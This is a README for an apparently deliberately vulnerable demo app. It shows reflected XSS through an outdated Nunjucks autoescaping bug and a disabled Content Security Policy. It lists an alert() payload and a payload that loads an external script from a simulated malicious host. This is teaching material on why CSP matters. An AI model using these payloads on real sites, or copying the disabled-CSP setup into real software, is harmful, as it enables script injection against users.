# XSS / CSP Exploit Example 

The purpose of this application is to demonstrate how a XSS exploit can be exacerbated
by a poor Content Security Policy.

The application purposefully uses an outdated version of the Nunjucks templating language
to exploit an issue with autoescaping user supplied content when supplied as an array
(https://github.com/mozilla/nunjucks/issues/835).

On top of this, the Content Security Policy is disabled for the page enabling external
scripts to be loaded. The purpose of this example is to illustrate how a CSP could help 
to reduce the impact of a XSS exploit. See `server/app.ts` line 47.

## To run the application

```
npm install
npm run start:dev 
```

Navigate to `http://localhost:3000?name=Jon`

## To exploit the application

Navigate to `http://localhost:3000?name[]=<script>alert('Exploited!')</script>exploiter`

## To demonstrate loading an external script

Serve the script on a different port to simulate serving it from a different, malicious site:
```
python -m SimpleHTTPServer 1234
```

Navigate to `http://localhost:3000?name[]=<script src="http://localhost:1234/innocuous-sounding-script.js"></script>exploiter`

